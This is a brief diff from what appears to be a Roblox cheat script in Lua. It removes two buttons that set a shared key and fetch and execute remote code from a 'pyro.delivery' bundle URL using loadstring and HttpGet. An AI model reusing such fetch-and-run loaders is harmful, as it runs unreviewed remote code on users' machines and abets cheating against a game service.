@@ -61,13 +61,3 @@ Use:FireServer(
 )
 end)
 --]]
-
-afs:NewButton("load (needed)", "pyro hub", function()
-    shared.discord_key = "BREAKING_BAD"
-loadstring(game:HttpGet("https://pyro.delivery/bundle.lua"))()
-end)
-
-afs:NewButton("auto food + job", "test", function()
-    shared.discord_key = "BREAKING_BAD"
-loadstring(game:HttpGet("https://pyro.delivery/bundle.lua"))()
-end)
